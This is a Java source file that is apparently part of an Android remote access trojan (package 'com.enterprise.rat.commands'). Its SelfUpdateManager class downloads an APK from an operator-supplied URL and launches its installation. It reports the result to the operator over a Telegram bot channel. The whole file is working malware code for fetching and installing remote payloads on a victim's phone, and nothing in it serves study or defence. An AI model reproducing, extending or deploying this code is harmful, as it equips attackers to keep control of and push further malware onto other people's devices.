package com.enterprise.rat.commands;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;

public class SelfUpdateManager {
    private Context context;
    public SelfUpdateManager(Context context) { this.context = context; }
    public void downloadAndInstall(String url) {
        new Thread(() -> {
            try {
                File apk = new File(context.getExternalCacheDir(), "update.apk");
                InputStream is = new URL(url).openStream();
                FileOutputStream fos = new FileOutputStream(apk);
                byte[] buf = new byte[4096]; int len;
                while ((len = is.read(buf)) > 0) fos.write(buf, 0, len);
                is.close(); fos.close();
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(apk), "application/vnd.android.package-archive");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
                context.startActivity(intent);
                TelegramApi.sendMessage("🔄 Update downloaded.");
            } catch (Exception e) { TelegramApi.sendMessage("❌ Update error"); }
        }).start();
    }
}
